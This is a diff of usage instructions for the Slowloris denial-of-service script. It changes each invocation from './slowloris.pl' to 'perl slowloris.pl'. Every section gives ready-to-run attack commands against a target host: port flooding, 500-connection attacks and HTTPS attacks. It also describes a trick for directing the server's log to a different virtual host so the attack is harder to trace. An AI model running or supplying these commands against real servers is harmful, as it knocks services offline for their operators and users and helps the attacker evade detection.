@@ -10,17 +10,17 @@ Run slowloris on command line
 
 ### Port FLooding
 Run slowloris on command line
-```./slowloris.pl -dns www.example.com -port 80```
+```perl slowloris.pl -dns www.example.com -port 80```
 
 ### Number of Port Attack
 Run slowloris on command line
-```./slowloris.pl -dns www.example.com -port 80 -num 500 ```
+```perl slowloris.pl -dns www.example.com -port 80 -num 500 ```
 
 ### HTTPS Attack
 Run slowloris on command line
-```./slowloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https```
+```perl slowloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https```
 
 There is another build in trick you might want to know. If you know that the Server is running several virtual hosts you can send the log to an other vhost than you are attacking!
 
-```./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com ```
+```perl slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com ```
 
